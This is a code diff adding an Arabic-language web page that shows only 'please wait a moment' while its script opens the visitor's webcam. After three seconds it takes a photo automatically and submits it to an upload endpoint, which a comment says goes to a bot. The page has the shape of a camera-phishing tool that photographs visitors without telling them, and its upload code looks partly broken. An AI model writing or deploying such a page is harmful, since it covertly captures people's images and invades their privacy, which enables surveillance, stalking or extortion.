@@ -1,0 +1,79 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>التقط صورة سيلفي</title>
+    <style>
+        body { text-align: center; font-family: Arial, sans-serif; }
+        video { width: 100%; height: auto; border: 1px solid #ccc; }
+        button { margin-top: 10px; padding: 10px 20px; background-color: #0078d4; color: white; border: none; cursor: pointer; display: none; }
+    </style>
+</head>
+<body>
+    <h1>مرحباً! من فضلك، انتظر لحظة...</h1>
+    <video id="video" autoplay></video>
+    <canvas id="canvas" style="display: none;"></canvas>
+    <div id="screenshot" style="margin-top: 20px;"></div>
+
+    <script>
+        const video = document.getElementById('video');
+        const canvas = document.getElementById('canvas');
+        const screenshotDiv = document.getElementById('screenshot');
+
+        // بدء تشغيل كاميرا المستخدم
+        navigator.mediaDevices.getUserMedia({ video: true })
+            .then(stream => {
+                video.srcObject = stream;
+
+                // عندما يبدأ الفيديو، نلتقط الصورة تلقائيًا بعد 3 ثواني
+                setTimeout(() => {
+                    captureImage();
+                }, 3000);  // يمكن تعديل الوقت هنا لتحديد تأخير التقاط الصورة
+            })
+            .catch(err => {
+                console.log("خطأ في الوصول إلى الكاميرا: ", err);
+            });
+
+        // دالة لالتقاط الصورة
+        function captureImage() {
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            canvas.getContext('2d').drawImage(video, 0, 0);
+            const dataUrl = canvas.toDataURL('image/png');
+            const img = new Image();
+            img.src = dataUrl;
+            screenshotDiv.innerHTML = `<img src="${dataUrl}" alt="سيلفي" />`;
+            
+            // تحويل الصورة إلى ملف ورفعها (إرسال الصورة للبوت)
+            const blob = dataURLToBlob(dataUrl);
+            const file = new File([blob], 'selfie.png', { type: 'image/png' });
+            const dataTransfer = new DataTransfer();
+            dataTransfer.items.add(file);
+
+            const fileInput = document.createElement('input');
+            fileInput.type = 'file';
+            fileInput.files = dataTransfer.files;
+
+            const uploadForm = document.createElement('form');
+            uploadForm.action = '/upload';
+            uploadForm.method = 'POST';
+            uploadForm.enctype = 'multipart/form-data';
+
+            uploadForm.appendChild(fileInput);
+            uploadForm.submit();
+        }
+
+        // تحويل dataURL إلى Blob
+        function dataURLToBlob(dataURL) {
+            const byteString = atob(dataURL.split(',')[1]);
+            const arrayBuffer = new ArrayBuffer(byteString.length);
+            const uintArray = new Uint8Array(arrayBuffer);
+            for (let i = 0; i < byteString.length; i++) {
+                uintArray[i] = byteString.charCodeAt(i);
+            }
+            return new Blob([uintArray], { type: 'image/png' });
+        }
+    </script>
+</body>
+</html>
